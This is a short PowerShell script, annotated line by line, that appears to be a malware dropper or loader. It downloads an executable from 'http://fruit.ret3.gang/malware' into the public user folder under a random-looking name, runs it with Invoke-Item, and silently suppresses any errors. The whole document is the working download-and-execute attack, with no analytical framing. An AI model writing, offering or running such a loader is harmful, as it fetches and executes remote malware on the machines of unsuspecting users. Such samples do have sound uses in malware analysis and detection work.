# Create a new WebClient object
$oaK = new-object Net.WebClient

# Set the URL from which the file will be downloaded
$OrA = 'http://fruit.ret3.gang/malware'

# Set a string that will be used as part of the filename for the downloaded file
$CNTA = 'NA-Hakrz09182afd4'

# Construct the full path where the downloaded file will be saved
$jri = $env:public + '' + $CNTA + '.exe'

# Try to download the file and execute it
try {
    $oaK.DownloadFile($OrA, $jri)
    Invoke-Item $jri
    break
} catch {
    # Handle exceptions here
}
